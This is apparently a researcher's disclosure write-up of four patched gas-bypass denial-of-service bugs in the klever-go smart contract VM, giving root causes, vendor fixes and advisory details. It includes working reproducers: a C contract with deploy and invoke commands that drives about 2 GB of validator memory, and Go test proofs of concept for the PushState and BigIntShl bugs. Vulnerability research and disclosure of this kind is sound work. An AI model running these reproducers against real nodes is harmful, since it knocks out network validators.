---
title: The Bill Comes After the Body
description: Four gas-bypass vulnerabilities in a Go virtual machine, with reproducible proof of concepts, measured impact, and the vendor fixes.
slug: the-bill-comes-after-the-body
published: 2026-11-05
updated: 2026-11-05
tags:
  - Go
  - Virtual machines
  - Blockchain security
  - Vulnerability research
featured: true
findings:
  - name: MBufferSetRandom
    severity: High
    score: CVSS 7.5
    advisory: GHSA-cg9c-gcgh-qgc3
    url: https://github.com/klever-io/klever-go/security/advisories/GHSA-cg9c-gcgh-qgc3
  - name: readKDATransfers
    severity: High
    score: CVSS 7.5
    advisory: GHSA-3xw3-gjh2-5j94
    url: https://github.com/klever-io/klever-go/security/advisories/GHSA-3xw3-gjh2-5j94
  - name: PushState
    severity: Moderate
    score: CVSS 5.3
    advisory: GHSA-gjm9-w2m6-rmp9
    url: https://github.com/klever-io/klever-go/security/advisories/GHSA-gjm9-w2m6-rmp9
  - name: BigIntShl
    severity: High
    score: CVSS 8.6
    advisory: GHSA-r2gq-244g-h8p2
    url: https://github.com/klever-io/klever-go/security/advisories/GHSA-r2gq-244g-h8p2
---

Two lines of Go, in a file inside `klever-io/klever-go`'s smart contract VM, let a signed 32-bit integer cost a validator a quarter gigabyte of RAM and a third of a second of CPU — for a declared price of 2,000 gas. That's `BigIntShl`, and it's the cleanest of four bugs that all turn out to be the same mistake: the node does the expensive thing, then checks whether the caller could afford it. By then the memory's resident and the cycles are spent. The only thing still undecided is whether the transaction gets to keep what it already cost the network.

These four predate the review pipeline I eventually built — that came later, it's a separate thing, and crediting it here would be wrong. What actually happened is an AI-assisted pass over the VM's hook surface across a few sessions, flagging candidates, and then me sitting with each one against the real host, confirming it line by line, building the full reproducer, and writing the report before any of it went near a vendor. Everything from here down is that second part, in full, not the summary of it.

`klever-go`'s KVM exposes around 242 host functions to contracts. 233 of them run inline — no goroutine, no timeout, nothing watching except the gas meter. One function, no backup. That's the terrain all four of these live on, and it's why "the charge came after the work" isn't a style nitpick here — it's the entire difference between a contract that costs what it says it costs and one that doesn't.

## MBufferSetRandom

[`GHSA-cg9c-gcgh-qgc3`](https://github.com/klever-io/klever-go/security/advisories/GHSA-cg9c-gcgh-qgc3) — High, CVSS 7.5

### Root cause: an unbounded caller-controlled size

This one didn't start as "look at `MBufferSetRandom`." It started as a sweep across every managed-buffer hook asking one dumb question: does the gas-charge call here return an error, or does it just record a number? Managed buffers are the VM's boxed byte-string type — contracts never see a raw pointer, they get an `int32` handle and the host does the actual allocating on their behalf, which means every hook that touches a buffer is a hook where the host, not the contract, pays the memory cost up front. Nineteen hooks came back "just records a number." I picked the sharpest one to build out in full.

```go
func (context *VMHooksImpl) MBufferSetRandom(destinationHandle int32, length int32) int32 {
    managedType := context.GetManagedTypesContext()
    runtime := context.GetRuntimeContext()
    metering := context.GetMeteringContext()

    if length < 1 {
        _ = context.WithFault(vmhost.ErrLengthOfBufferNotCorrect, runtime.ManagedBufferAPIErrorShouldFailExecution())
        return -1
    }

    baseGasToUse := metering.GasSchedule().ManagedBufferAPICost.MBufferSetRandom
    lengthDependentGasToUse := math.MulUint64(metering.GasSchedule().BaseOperationCost.DataCopyPerByte, uint64(length))
    gasToUse := math.AddUint64(baseGasToUse, lengthDependentGasToUse)
    metering.UseGasAndAddTracedGas(mBufferSetRandomName, gasToUse)

    randomizer := managedType.GetRandReader()
    buffer := make([]byte, length)
    _, err := randomizer.Read(buffer)
    if context.WithFault(err, runtime.ManagedBufferAPIErrorShouldFailExecution()) {
        return -1
    }

    managedType.SetBytes(destinationHandle, buffer)
    return 0
}
```
[`manBufOps.go#L639-L663`, v1.7.20](https://github.com/klever-io/klever-go/blob/4c56fd705d6ca3fd84f9149ebebcdd456f42e634/kvm/vmhost/vmhooks/manBufOps.go#L639-L663)

`length < 1` is the only validation on the input. No upper bound. `UseGasAndAddTracedGas` routes to `UseGas`, which adds to a running counter and returns nothing — no `error`, no bool, nothing to check against remaining gas. It's a ledger write, not a gate. So: a contract calls this with `length = 2147483647`, the host allocates a 2 GiB slice, fills every byte of it from the randomness source, then `SetBytes` copies that same 2 GiB a second time into the managed-type store. Two full passes over two gigabytes. The declared cost for all of it works out to roughly a thousand gas — base cost plus `DataCopyPerByte × length`, and the gas schedule's per-byte rate on this path is small enough that even at the full `int32` ceiling it doesn't clear five figures.

### Trigger: one call, one argument

The attacker side of this is almost insultingly simple compared to the other three: no setup contract, no handle juggling, no multi-step state. One call, one argument, done. That's actually part of why it was worth writing up on its own even once the nineteen-hook cluster was clear — it's the hook where the exploit and the bug are the same five words: "pass in a big number."

It wasn't the only cluster of nineteen, though, and here's the part I didn't love finding out: CertiK was auditing the same repo at the same time, under their own internal ticket — KLR-50 — and had already scoped the identical nineteen-hook family before my report landed. Four of the nineteen charged *no* per-byte gas at all, not even the unbounded kind — `MBufferStorageLoadFromAddress` among them. By the time I filed against `MBufferSetRandom` specifically, a private fix was already merged. I didn't know that when I sent it. The published advisory credits both of us: CertiK for scoping the full cluster and recommending the length cap as defense in depth, me as an independent reporter against the sharpest single instance — reported 2026-09-16, credited 2026-09-18, advisory published 2026-09-21. Two unrelated audits landing on the same organ failure in the same ten-day window isn't a coincidence worth dismissing; it's usually a sign the pattern was real and findable from more than one angle.

### Fix: cap the input, then bound the charge

The fix — `FixAuditChangesV5`, mainnet-active 2026-09-18 — has two parts that only work together. First, a hard ceiling:

```go
const maxManagedBufferLength = maxTotalArgumentsBytes // 16,000,000 bytes
```

checked *before* any gas math runs, in the hooks that take a caller-supplied size. Second, the charge function itself stops being an unconditional write:

```go
func useBoundedGas(host vmhost.VMHost, functionName string, gasToUse uint64) error {
    metering := host.Metering()
    if !host.ForkController().FixAuditChangesV5() {
        metering.UseGasAndAddTracedGas(functionName, gasToUse)
        return nil
    }
    return metering.UseGasBoundedAndAddTracedGas(functionName, gasToUse)
}
```
[`manBufOps.go#L116-L124`, current](https://github.com/klever-io/klever-go/blob/b352d678209ae8123c76bc570b998e75d09786a9/kvm/vmhost/vmhooks/manBufOps.go#L116-L124)

`UseGasBoundedAndAddTracedGas` checks `GasLeft() < gasToUse` and returns `ErrNotEnoughGas` before a single byte is touched. The commit message for the fix states the fix's whole philosophy in one line: *bound managed buffer hook gas before host work.* Converting the unmetered sites to a flat bounded charge wouldn't have been enough either — an attacker with exactly enough gas for the flat charge still forces the full allocation. The per-byte pre-charge is what actually caps the work, and it's why the cap check comes first: it has to hold regardless of whatever number the gas schedule happens to price a byte at.

## readKDATransfers

[`GHSA-3xw3-gjh2-5j94`](https://github.com/klever-io/klever-go/security/advisories/GHSA-3xw3-gjh2-5j94) — High, CVSS 7.5

### Where the extra copies come from

There's an older bug in this codebase: `ReadManagedVecOfManagedBuffers`, a different decoder, filed and fixed as its own advisory months earlier, same underlying shape. The standard move once you've seen that pattern once is to go check every sibling decoder for the same disease instead of assuming the first fix covered the family. It didn't. `readKDATransfers` is the second decoder, reached through `ManagedMultiTransferKDANFTExecute`, and it has the identical clone-before-charge structure one call deeper.

Each KDA-transfer record is 16 bytes: a 4-byte handle to a token-identifier buffer, 8 bytes of nonce, a 4-byte handle to a bigint value. The decoder walks the vector and, for every record, clones whatever the token-identifier handle points to:

```go
func readKDATransfer(host vmhost.VMHost, data []byte) (*vmcommon.KDATransfer, error) {
    ...
    tokenIdentifierHandle := int32(binary.BigEndian.Uint32(data[0:4]))
    tokenIdentifier, err := managedType.GetBytes(tokenIdentifierHandle) // clone, every record
    ...
    managedType.ConsumeGasForBigIntCopy(value)
}

func readKDATransfers(host vmhost.VMHost, managedVecHandle int32) ([]*vmcommon.KDATransfer, error) {
    managedVecBytes, err := managedType.GetBytes(managedVecHandle)
    managedType.ConsumeGasForBytes(managedVecBytes)   // unbounded, after
    numTransfers := len(managedVecBytes) / kdaTransferLen
    for i := 0; i < len(managedVecBytes); i += kdaTransferLen {
        kdaTransfer, err := readKDATransfer(managedType, managedVecBytes[i:i+kdaTransferLen])
        result = append(result, kdaTransfer)
    }
    return result, nil
}
```

`GetBytes` always returns a fresh clone — that's just what it does, for every caller, by design. Nothing in the record format requires distinct handles across records, so there's nothing stopping a thousand records from all naming the same pair.

### Reproducing the memory amplification

Building it out as a real attack: one deployed contract, one exported function, two arguments controlling the scale.

```c
#include "../mxvm/context.h"

extern int bigIntNew(long long value);
extern int managedMultiTransferKDANFTExecute(int dstHandle,
                                             int tokenTransfersHandle,
                                             long long gasLimit,
                                             int functionHandle,
                                             int argumentsHandle);

#define SEED_LEN 64
#define ADDR_LEN 32
#define KDA_TRANSFER_LEN 16

static byte seed[SEED_LEN] = "Qk3vP9mZ7xLw2Ad5Rn8Tc6Yb4Hs1Ej0UgViOpKfMzNqWrXtLyBdCaSeGhJuI";
static byte selfAddr[ADDR_LEN];
static byte record[KDA_TRANSFER_LEN];
static byte okMsg[] = "ok";

void init() {}

static void putHandle(byte *dst, int handle) {
    dst[0] = (byte)(handle >> 24);
    dst[1] = (byte)(handle >> 16);
    dst[2] = (byte)(handle >> 8);
    dst[3] = (byte)handle;
}

// kdaAmplify(itemDoublings, vecDoublings)
// Builds ONE token-identifier buffer of 64 * 2^itemDoublings bytes and ONE bigint,
// then a KDA-transfer vector of 2^vecDoublings 16-byte records that ALL reference
// that same pair of handles.
void kdaAmplify() {
    long long itemDoublings = int64getArgument(0);
    long long vecDoublings = int64getArgument(1);

    int tokenId = mBufferNewFromBytes(seed, SEED_LEN);
    for (long long i = 0; i < itemDoublings; i++) {
        mBufferAppend(tokenId, tokenId);           // doubling, not growing linearly
    }

    int value = bigIntNew(1);
    putHandle(&record[0], tokenId);
    for (int i = 4; i < 12; i++) record[i] = 0;    // nonce = 0 -> fungible
    putHandle(&record[12], value);

    int vec = mBufferNewFromBytes(record, KDA_TRANSFER_LEN);
    for (long long i = 0; i < vecDoublings; i++) {
        mBufferAppend(vec, vec);                   // same doubling trick on the vector
    }

    getSCAddress(selfAddr);
    int dst = mBufferNewFromBytes(selfAddr, ADDR_LEN);
    int fn = mBufferNewFromBytes(okMsg, 0);
    int args = mBufferNewFromBytes(okMsg, 0);

    managedMultiTransferKDANFTExecute(dst, vec, 0, fn, args);
    finish(okMsg, 2);
}
```

Deployed and driven against a live local network the same way any contract would be:

```bash
mkdir -p kvm/test/contracts/kda-vec-amplify/output
./buildWasmC.sh ./kvm/test/contracts/kda-vec-amplify

koperator sc create \
    --node=http://localhost:8805 \
    --key-file=<funded-wallet>.pem \
    --wasm=kvm/test/contracts/kda-vec-amplify/output/kda-vec-amplify.wasm \
    --upgradeable --readable --payable --payableBySC \
    --sign --await --result-only
```

Then, with the node's RSS sampled on either side of a single invoke:

```bash
PID=$(lsof -nP -iTCP:8805 -sTCP:LISTEN | awk 'NR==2{print $2}')
ps -o rss= -p "$PID"

koperator sc invoke <contract> kdaAmplify \
    --args "u64:12" --args "u64:13" \
    --node=http://localhost:8805 --key-file=<funded-wallet>.pem --create-only

ps -o rss= -p "$PID"
```

`u64:12` and `u64:13` — twelve doublings on the token identifier (64 bytes → 262,144 bytes), thirteen doublings on the vector (1 record → 8,192 records, all pointing at that one 262,144-byte buffer):

| Token identifier | Records | Predicted clone traffic | Measured RSS delta | Wall time |
|---|---|---|---|---|
| 262,144 B | 1,024 | 256 MB | 224.5 MB | 0.08 s |
| 262,144 B | 8,192 | 2,048 MB | 2,052 MB | 0.25 s |

```text
=== tokenId=262144B records=8192 predicted clone=2048.0MB ===
error: error creating transaction: validation error: invalid argument: VMExecutionFailed - (not enough gas was sent in the transaction)
elapsed=0.25s
rss delta=2052.0MB (before=2711MB after=4763MB)
```

Two gigabytes, resident, in a quarter second, on every single validator and observer processing that block — and the transaction still fails at the end for insufficient gas. The node already paid before it found out the caller couldn't. The client-side estimate never catches this either, and that's structural, not a missed edge case: `CheckValidityTxValues` prices a transaction without simulating it. Gas is whatever the sender bought, capped only by the per-transaction ceiling.

I wasn't fully sure for about two days that this was the specific bug that ended up filed as `GHSA-3xw3`. Matching the shape of a known family isn't the same as confirming you've found the specific instance someone else already reported — and the credits on this one list three names: the maintainers caught it independently during their own internal triage of the sibling decoder's report, and so did I, close enough in time that neither of us clearly had it first. What actually settled it, days later, was finding the vendor's own post-fix regression test with the advisory ID sitting right in the filename:

```go
tokenIdentifier, err := loadMBufferBytes(host, tokenIdentifierHandle, dataCopyPerByte, dataCopyPerByte)
```
[`managedConversions.go#L38-L42`, current](https://github.com/klever-io/klever-go/blob/b352d678209ae8123c76bc570b998e75d09786a9/kvm/vmhost/vmhooks/managedConversions.go#L38-L42)

### Fix: estimate the copy before making it

`loadMBufferBytes`, post-fork, reads the buffer's *declared* length from the managed-type store — metadata, free to read — multiplies by the per-byte rate, and calls `UseGasBounded` before cloning a single byte. Can't pay, no clone, no allocation.

## PushState

[`GHSA-gjm9-w2m6-rmp9`](https://github.com/klever-io/klever-go/security/advisories/GHSA-gjm9-w2m6-rmp9) — Moderate, CVSS 5.3

### Root cause: cloning every live handle

Different axis on this one. Not bytes this time — handle count. Every managed bigint a contract creates lives in a Go map keyed by `int32` handle, and there's no ceiling on how large that map can get:

```go
func (context *managedTypesContext) GetBigIntOrCreate(handle int32) *big.Int {
    value, ok := context.managedTypesValues.bigIntValues[handle]
    if !ok {
        value = big.NewInt(0)
        context.managedTypesValues.bigIntValues[handle] = value
    }
    return value
}
```

### Trigger: nested calls snapshot the map

Nested contract calls — `ExecuteOnDestContext`, `ExecuteOnSameContext` — snapshot the parent's managed-type state before descending, via `PushState`. Pre-fix, that snapshot was a full deep clone of every bigint in the map:

```go
for bigIntHandle, bigInt := range context.managedTypesValues.bigIntValues {
    newBigIntState[bigIntHandle] = big.NewInt(0).Set(bigInt)
}
```
[`managedType.go#L206-L208`, v1.7.21](https://github.com/klever-io/klever-go/blob/8cd6484de07b7bcb23ddf305f8f5b91cbe9bde51/kvm/vmhost/contexts/managedType.go#L206-L208)

Zero gas charged for the entry count, zero for the bytes copied. The trigger is two steps: build the handle set with ordinary, individually-metered `BigIntNew` calls, then make one nested call. Against the production VM host, production hooks, and the real `PushState` implementation — no mocked clone, no substitution:

```go
func TestBigIntHandlePushStateCloneGasBypassPoC(t *testing.T) {
    const (
        handleCount  = 199_000
        providedGas  = uint64(400_000_000)
        bigIntNewGas = uint64(2_000)
    )

    params := makeHostParameters()
    params.GasSchedule = kvmConfig.MakeGasMap(1)
    params.GasSchedule["BigIntAPICost"]["BigIntNew"] = bigIntNewGas

    host, err := hostCore.NewVMHost(worldmock.NewMockWorld(), params)
    require.NoError(t, err)
    hooks := vmhooks.NewVMHooksImpl(host)

    tracker, ok := host.Runtime().GetInstanceTracker().(replaceablePushStateTracker)
    require.True(t, ok)
    tracker.ReplaceInstance(contextmock.NewInstanceMock(nil))
    provideGas(hooks, providedGas)

    // BigIntNew is the exported op a contract actually calls; each one
    // creates a distinct handle in the real context map.
    for i := 0; i < handleCount; i++ {
        hooks.BigIntNew(0)
    }

    gasBefore := hooks.GetRuntimeContext().GetPointsUsed()
    var before, after runtime.MemStats
    runtime.GC()
    runtime.ReadMemStats(&before)
    started := time.Now()

    host.ManagedTypes().PushState()  // the exact op reached by nested execution

    elapsed := time.Since(started)
    runtime.ReadMemStats(&after)
    gasAfter := hooks.GetRuntimeContext().GetPointsUsed()
    allocDelta := after.TotalAlloc - before.TotalAlloc

    fmt.Printf("POC_RESULT handles=%d gas_before_push=%d gas_after_push=%d push_gas_delta=%d provided_gas=%d alloc_delta_bytes=%d elapsed=%s\n",
        handleCount, gasBefore, gasAfter, gasAfter-gasBefore, providedGas, allocDelta, elapsed)

    require.Equal(t, gasBefore, gasAfter, "PushState clone must not consume gas on the vulnerable revision")
    require.Greater(t, allocDelta, uint64(handleCount), "PushState must allocate cloned map/value state")
}
```

```
POC_RESULT handles=199000 gas_before_push=398000000 gas_after_push=398000000 push_gas_delta=0 provided_gas=400000000 alloc_delta_bytes=11097808 elapsed=36.391704ms
--- PASS: TestBigIntHandlePushStateCloneGasBypassPoC (0.10s)
```

### Measured impact

`push_gas_delta=0`. 199,000 entries, 11 MB moved, 36 milliseconds, for nothing.

Filed 2026-09-14. fbsobreira's reply came back two days later, and he didn't just take the severity on faith — he reran the numbers against Klever's own cost model and came back sharper than what I'd put in the report: the handle set cost around 78% of a transaction's gas budget to build, and bought roughly 83 MiB of allocation on the snapshot for free, which he put at "around 250x underpriced against our own copy rate." I followed up the same day asking to start the bounty process, the same way I had on the earlier reports, and asked him to loop in Klever's security contact — he tagged `@wesleyrsilvasec` directly in the thread. Advisory went out with my credit as the accepted reporter.

### Fix: move state instead of cloning it

The fix here isn't a bounded charge. It's deleting the operation that needed charging:

```go
func (context *managedTypesContext) pushStateByMove() {
    stackedState := context.managedTypesValues
    stackedState.backTransfers = context.cloneBackTransfers()
    context.managedTypesStack = append(context.managedTypesStack, stackedState)
    context.InitState()
}
```
[`managedType.go#L176-L181`, current](https://github.com/klever-io/klever-go/blob/b352d678209ae8123c76bc570b998e75d09786a9/kvm/vmhost/contexts/managedType.go#L176-L181)

Every nested call now starts on a genuinely empty state — the parent's maps move onto the stack by reference, `InitState` hands the active context fresh ones, and `PopSetActiveState` hands the originals back when the nested call returns. Nothing to clone means nothing to meter.

## BigIntShl

[`GHSA-r2gq-244g-h8p2`](https://github.com/klever-io/klever-go/security/advisories/GHSA-r2gq-244g-h8p2) — High, CVSS 8.6

### Root cause: allocate first, charge afterward

This is the one I'd show someone with thirty seconds:

```go
dest.Lsh(a, uint(bits))                     // allocation and work first
managedType.ConsumeGasForBigIntCopy(dest)   // result-size charge afterward
```
[`bigIntOps.go#L921-L943`, v1.7.21](https://github.com/klever-io/klever-go/blob/8cd6484de07b7bcb23ddf305f8f5b91cbe9bde51/kvm/vmhost/vmhooks/bigIntOps.go#L921-L943)

`bits` is a signed `int32`, checked only for being negative. Trigger: a managed bigint with value `1`, a single call to `BigIntShl(dest, src, 0x7fffffff)`. The result is `1` shifted left by 2,147,483,647 bits — a 268,435,456-byte number, 256 MiB, and `Lsh` has to build the whole thing before the function can do anything else with it.

### Reproducing the oversized result

```go
func TestBigIntShlResultGasBypassPoC(t *testing.T) {
    const (
        shiftBits       = int32(0x7fffffff)
        providedGas     = uint64(1_000_000)
        copyGasPerByte  = uint64(1_000)
        bigIntShlGas    = uint64(2_000)
    )

    params := makeHostParameters()
    params.GasSchedule = kvmConfig.MakeGasMap(1)
    params.GasSchedule["BigIntAPICost"]["BigIntShl"] = bigIntShlGas
    params.GasSchedule["BigIntAPICost"]["CopyPerByteForTooBig"] = copyGasPerByte

    host, err := hostCore.NewVMHost(worldmock.NewMockWorld(), params)
    require.NoError(t, err)
    hooks := vmhooks.NewVMHooksImpl(host)

    tracker, ok := host.Runtime().GetInstanceTracker().(replaceableInstanceTracker)
    require.True(t, ok)
    tracker.ReplaceInstance(contextmock.NewInstanceMock(nil))
    provideGas(hooks, providedGas)

    sourceHandle := hooks.BigIntNew(1)
    destinationHandle := hooks.BigIntNew(0)

    var before, after runtime.MemStats
    runtime.GC()
    runtime.ReadMemStats(&before)
    started := time.Now()
    hooks.BigIntShl(destinationHandle, sourceHandle, shiftBits)   // the real, unmocked hook
    elapsed := time.Since(started)
    runtime.ReadMemStats(&after)

    result, err := host.ManagedTypes().GetBigInt(destinationHandle)
    require.NoError(t, err)
    require.Equal(t, int(shiftBits)+1, result.BitLen())

    gasUsed := hooks.GetRuntimeContext().GetPointsUsed()
    allocDelta := after.TotalAlloc - before.TotalAlloc

    fmt.Printf("POC_RESULT shift_bits=%d result_bytes=%d provided_gas=%d gas_used=%d alloc_delta_bytes=%d elapsed=%s\n",
        shiftBits, (uint64(result.BitLen())+7)/8, providedGas, gasUsed, allocDelta, elapsed)

    if gasUsed <= providedGas {
        t.Fatalf("expected post-Lsh accounting to exceed provided gas; gas_used=%d provided=%d", gasUsed, providedGas)
    }
}
```

```text
ERROR GasUsed > GasProvided gasProvided = 1000000 gasUsed = 268435458002
POC_RESULT shift_bits=2147483647 result_bytes=268435456 expected_copy_gas=268435456000 provided_gas=1000000 gas_used=268435458002 gas_left=0 alloc_delta_bytes=268449432 elapsed=324.436917ms
--- PASS: TestBigIntShlResultGasBypassPoC (0.33s)
```

A quarter gigabyte, a third of a second of CPU, for a declared cost of 2,000 gas against a result-size bill that works out to 268 billion — a six-order-of-magnitude gap between what the contract paid for and what the host actually did.

### Vendor response and disclosure

Filed 2026-09-14, same day as `PushState`. fbsobreira's reply came back the next day, and it was short: *"your analysis is correct, and we agree with your High rating."* They'd already reproduced it on a live node before I'd finished writing the report up properly. I sent the same bounty-process follow-up I'd sent on the others. Advisory published with the fix gated behind `FixAuditChangesV6`.

### Fix: calculate and charge before shifting

What actually bugs me about this one is that the right pattern wasn't foreign to the file. Forty lines down, `BigIntPow` already does it correctly — and has been hardened twice before, across two separate forks:

```go
fixAuditV3 := context.host.ForkController().FixAuditChangesV3()
if fixAuditV3 && b.Sign() < 0 {
    _ = context.WithFault(vmhost.ErrBadLowerBounds, runtime.BigIntAPIErrorShouldFailExecution())
    return
}

opBitLength := int64(a.BitLen())
lengthOfResult := big.NewInt(0).Div(big.NewInt(0).Mul(b, big.NewInt(opBitLength)), big.NewInt(8))
err = managedType.ConsumeGasForThisBigIntNumberOfBytes(lengthOfResult)   // bounded, before Exp
if context.WithFault(err, runtime.BigIntAPIErrorShouldFailExecution()) {
    return
}
```
[`bigIntOps.go#L785-L799`, current](https://github.com/klever-io/klever-go/blob/b352d678209ae8123c76bc570b998e75d09786a9/kvm/vmhost/vmhooks/bigIntOps.go#L785-L799)

Compute the expected size, charge for it bounded, *then* exponentiate — and a shift's result size is easier to predict than a power's, since it's just the operand's bit length plus the shift count, no multiplication against an arbitrary exponent required. The post-fix `BigIntShl` finally matches it:

```go
if context.host.ForkController().FixAuditChangesV6() {
    resultByteLen := int64(0)
    if a.Sign() != 0 {
        resultByteLen = (int64(a.BitLen()) + int64(bits) + 7) / 8
    }
    err = managedType.ConsumeGasForThisIntNumberOfBytesBounded(resultByteLen)
    if context.WithFault(err, runtime.BigIntAPIErrorShouldFailExecution()) {
        return
    }
    dest.Lsh(a, uint(bits))
    return
}
```
[`bigIntOps.go#L1129-L1139`, current](https://github.com/klever-io/klever-go/blob/b352d678209ae8123c76bc570b998e75d09786a9/kvm/vmhost/vmhooks/bigIntOps.go#L1129-L1139)

Compute. Charge, bounded. Then shift.

## The shared failure mode

Strip away which hook, which type, which call depth, and all four collapse onto the same three-step error: do the expensive thing, measure what it cost, charge for it afterward, with the charging step built as a counter that cannot refuse. `UseGas`, `UseAndTraceGas`, `UseGasAndAddTracedGas`, `ConsumeGasForBytes`, `ConsumeGasForBigIntCopy` — five different names, one unconditional write underneath all of them. The single function in the whole metering package that can actually say no, `UseGasBounded`, was conspicuously under-used relative to how many call sites needed it.

None of these four move a token or fork the chain. They're availability bugs, and on a network where every validator executes the identical block, that means every validator performs the identical expensive allocation at the identical moment. Not a crash. A scheduled one — the one failure mode a decentralized network is specifically supposed to resist, failing in exactly the shape it's built not to.

`FixAuditChangesV5` — September 18. `FixAuditChangesV6` — shipped in 1.7.22. Nineteen advisories total credited against this repo; these four are the ones that actually mattered, and the bill, from here on, comes first.
